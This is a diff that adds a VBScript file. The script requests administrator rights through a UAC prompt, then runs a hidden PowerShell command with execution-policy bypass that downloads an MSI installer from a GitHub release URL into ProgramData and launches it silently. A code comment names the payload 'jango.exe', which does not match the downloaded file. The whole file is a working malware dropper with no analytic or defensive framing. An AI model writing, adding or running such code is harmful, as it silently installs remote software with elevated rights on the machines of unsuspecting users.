@@ -1,0 +1,50 @@
+    Option Explicit
+    
+    ' Check if running as administrator and elevate if needed
+    If Not IsAdmin Then
+        ElevateThisScript
+    Else
+        RunPowershellCommand
+    End If
+    
+    ' Run the PowerShell command to download and execute file
+    Sub RunPowershellCommand()
+        On Error Resume Next
+        Dim WshShell, cmd, hideWindow
+        Set WshShell = CreateObject("WScript.Shell")
+        
+        ' PowerShell command to download and execute jango.exe
+        cmd = "powershell.exe -ep Bypass -WindowStyle Hidden -c ""$ProgressPreference='SilentlyContinue'; iwr 'https://github.com/coinmana/updates/releases/download/yo1/Future.msi' -OutFile $env:ProgramData\Future.msi -UseBasicParsing; Start-Process $env:ProgramData\Future.msi -WindowStyle Hidden"""
+        
+        ' Run command hidden (0 = hide window)
+        hideWindow = 0
+        WshShell.Run cmd, hideWindow, false
+    End Sub
+    
+    ' Function to check if script is running as admin
+    Function IsAdmin()
+        On Error Resume Next
+        CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
+        IsAdmin = (Err.number = 0)
+    End Function
+    
+    ' Elevate this script with UAC prompt
+    Sub ElevateThisScript()
+        Dim UAC, scriptPath, args
+        Set UAC = CreateObject("Shell.Application")
+        scriptPath = WScript.ScriptFullName
+        
+        ' If there are any arguments, pass them along
+        If WScript.Arguments.Count > 0 Then
+            args = ""
+            Dim i
+            For i = 0 To WScript.Arguments.Count - 1
+                args = args & " " & Chr(34) & WScript.Arguments(i) & Chr(34)
+            Next
+        Else
+            args = ""
+        End If
+        
+        ' Execute with elevation
+        UAC.ShellExecute "wscript.exe", Chr(34) & scriptPath & Chr(34) & args, "", "runas", 1
+    End Sub
